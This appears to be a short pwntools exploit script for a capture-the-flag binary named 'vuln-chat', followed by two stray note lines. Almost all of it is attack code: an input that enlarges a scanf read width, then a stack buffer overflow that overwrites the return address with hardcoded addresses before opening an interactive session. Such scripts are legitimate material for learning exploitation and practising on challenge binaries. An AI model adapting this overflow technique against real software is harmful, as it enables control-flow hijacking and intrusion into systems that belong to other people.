from pwn import *

target = process("./vuln-chat")

payload = b"a" * 20
payload += b"%99s"
target.sendline(payload)
payload = b"A" * 0x31
payload += p32(0x08048589)
payload += p32(0x0804856b)

target.sendline(payload)

target.interactive()

# 0xffffcb30

scanf("%d", &d)